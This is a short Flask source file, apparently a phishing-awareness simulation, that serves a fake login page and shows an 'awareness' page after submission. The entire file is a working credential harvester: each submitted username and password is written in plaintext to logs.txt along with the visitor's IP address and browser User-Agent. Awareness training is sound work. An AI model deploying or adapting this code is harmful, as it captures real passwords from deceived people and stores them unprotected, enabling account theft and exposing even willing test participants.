from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("username")
        pw = request.form.get("password")

        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")

        with open("logs.txt", "a") as f:
            f.write(
                f"{datetime.now()} | "
                f"IP: {ip} | "
                f"UA: {user_agent} | "
                f"USER: {user} | "
                f"PASS: {pw}\n"
            )

        return render_template("awareness.html")

    return render_template("login.html")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)

